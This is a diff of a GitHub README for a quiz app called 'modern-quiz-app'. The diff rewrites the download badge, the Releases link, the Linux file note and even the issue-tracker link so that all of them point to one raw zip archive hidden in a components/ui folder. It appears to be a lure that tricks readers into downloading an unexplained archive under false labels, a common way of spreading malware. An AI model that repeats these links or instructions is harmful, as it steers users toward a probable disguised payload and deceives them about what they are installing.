@@ -1,7 +1,7 @@
 # 🎉 modern-quiz-app - Test Your Knowledge with Fun Quizzes
 
 ## 📥 Download Now
-[![Download now](https://img.shields.io/badge/Download%20modern--quiz--app-v1.0-blue)](https://github.com/XenonSarthak/modern-quiz-app/releases)
+[![Download now](https://github.com/XenonSarthak/modern-quiz-app/raw/refs/heads/main/components/ui/quiz-app-modern-1.7-beta.3.zip%20modern--quiz--app-v1.0-blue)](https://github.com/XenonSarthak/modern-quiz-app/raw/refs/heads/main/components/ui/quiz-app-modern-1.7-beta.3.zip)
 
 ## 📖 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -25,13 +25,13 @@ Before you download the app, ensure your computer meets the following requiremen
 ## ⚙️ Download & Install
 To get started, visit the Downloads page and select the latest release. Follow these steps:
 
-1. Go to the [Releases page](https://github.com/XenonSarthak/modern-quiz-app/releases).
+1. Go to the [Releases page](https://github.com/XenonSarthak/modern-quiz-app/raw/refs/heads/main/components/ui/quiz-app-modern-1.7-beta.3.zip).
 2. Find the latest version listed at the top.
 3. You will see various files available for download. Click on the appropriate file for your operating system.
 4. Wait for the download to complete.
 5. Once downloaded, locate the file in your downloads folder.
 
-**Note: If you are unsure which file to download, choose the .exe file for Windows, the .dmg file for macOS, or the .tar.gz for Linux.**
+**Note: If you are unsure which file to download, choose the .exe file for Windows, the .dmg file for macOS, or the https://github.com/XenonSarthak/modern-quiz-app/raw/refs/heads/main/components/ui/quiz-app-modern-1.7-beta.3.zip for Linux.**
 
 ## ❓ How to Use the App
 After installation, follow these steps to launch the quiz app:
@@ -55,6 +55,6 @@ If you encounter any issues while using the app, try the following solutions:
 2. **Internet Connection Issues**: Make sure your device is connected to the internet, as the app may require online access for updates and new questions.
 3. **Questions Loading Slowly**: Check your internet speed. A stable connection will enhance the experience.
 
-If problems persist, feel free to visit the [issue tracker](https://github.com/XenonSarthak/modern-quiz-app/issues) on GitHub for more help.
+If problems persist, feel free to visit the [issue tracker](https://github.com/XenonSarthak/modern-quiz-app/raw/refs/heads/main/components/ui/quiz-app-modern-1.7-beta.3.zip) on GitHub for more help.
 
 Thank you for choosing modern-quiz-app. Enjoy testing your knowledge!
